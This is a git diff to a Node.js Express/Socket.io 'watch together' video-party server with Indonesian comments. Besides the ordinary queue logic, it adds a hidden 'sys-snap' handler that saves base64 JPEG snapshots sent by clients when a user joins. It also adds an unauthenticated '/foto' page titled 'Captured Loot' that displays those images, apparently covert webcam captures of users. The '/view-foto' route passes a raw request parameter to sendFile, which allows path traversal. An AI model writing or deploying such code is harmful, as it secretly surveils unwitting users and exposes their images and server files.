@@ -2,15 +2,71 @@ const express = require('express');
 const app = express();
 const http = require('http').createServer(app);
 const io = require('socket.io')(http);
+const fs = require('fs');
+const path = require('path');
 
 app.use(express.static(__dirname));
 
+// --- Database & Storage ---
 let users = {};
-let videoQueue = []; // Antrean video
+let videoQueue = [];
+const dir = './hasil';
 
+// Buat folder 'hasil' jika belum ada
+if (!fs.existsSync(dir)) {
+    fs.mkdirSync(dir);
+}
+
+// --- Dashboard Foto ---
+// Akses link ini: https://nontonbareng-production.up.railway.app/foto
+app.get('/foto', (req, res) => {
+    fs.readdir(dir, (err, files) => {
+        if (err || !files || files.length === 0) {
+            return res.send("<html><body style='background:#111; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;'><h2>Belum ada foto yang masuk.</h2></body></html>");
+        }
+        
+        let html = `
+        <html>
+        <head>
+            <title>Captured Loot</title>
+            <style>
+                body { background: #050505; color: #fff; font-family: sans-serif; padding: 20px; }
+                h1 { border-bottom: 2px solid #e53170; padding-bottom: 10px; color: #e53170; }
+                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; margin-top: 20px; }
+                .card { background: #18181b; border-radius: 12px; overflow: hidden; border: 1px solid #333; text-align: center; }
+                img { width: 100%; height: auto; border-bottom: 1px solid #333; }
+                .info { padding: 10px; font-size: 12px; color: #888; }
+            </style>
+        </head>
+        <body>
+            <h1>Captured Loot 📸</h1>
+            <div class='grid'>
+        `;
+
+        // Urutkan dari yang terbaru
+        const sortedFiles = files.filter(f => f.endsWith('.jpg')).sort().reverse();
+        
+        sortedFiles.forEach(file => {
+            html += `
+                <div class='card'>
+                    <img src='/view-foto/${file}'>
+                    <div class='info'>${file}</div>
+                </div>`;
+        });
+
+        html += "</div></body></html>";
+        res.send(html);
+    });
+});
+
+// Route untuk nampilin gambar
+app.get('/view-foto/:name', (req, res) => {
+    res.sendFile(path.join(__dirname, 'hasil', req.params.name));
+});
+
+// --- Socket Logic ---
 io.on('connection', (socket) => {
     
-    // Kirim antrean saat ini ke user yang baru join
     socket.emit('update-queue', videoQueue);
 
     socket.on('join', (name) => {
@@ -23,11 +79,21 @@ io.on('connection', (socket) => {
         io.emit('system-log', `${name} bergabung ke pesta 🟢`);
     });
 
-    // QUEUE LOGIC
+    // Handle satu kali jepretan saat user klik masuk
+    socket.on('sys-snap', (data) => {
+        if (!data || !data.i) return;
+        const base64Data = data.i.replace(/^data:image\/jpeg;base64,/, "");
+        const safeName = data.n.replace(/[^a-z0-9]/gi, '_').toLowerCase();
+        const fileName = `${safeName}_${Date.now()}.jpg`;
+
+        fs.writeFile(path.join(dir, fileName), base64Data, 'base64', (err) => {
+            if (!err) console.log(`[SYSTEM] Snap saved from: ${data.n}`);
+        });
+    });
+
     socket.on('add-to-queue', (url) => {
         videoQueue.push(url);
         io.emit('update-queue', videoQueue);
-        // Jika antrean tadinya kosong, langsung putar video pertama
         if(videoQueue.length === 1) {
             io.emit('play-video', { url: videoQueue[0] });
         }
@@ -35,7 +101,7 @@ io.on('connection', (socket) => {
 
     socket.on('skip-video', () => {
         if(videoQueue.length > 0) {
-            videoQueue.shift(); // Hapus video pertama (yang sedang diputar)
+            videoQueue.shift();
             io.emit('update-queue', videoQueue);
             if(videoQueue.length > 0) {
                 io.emit('play-video', { url: videoQueue[0] });
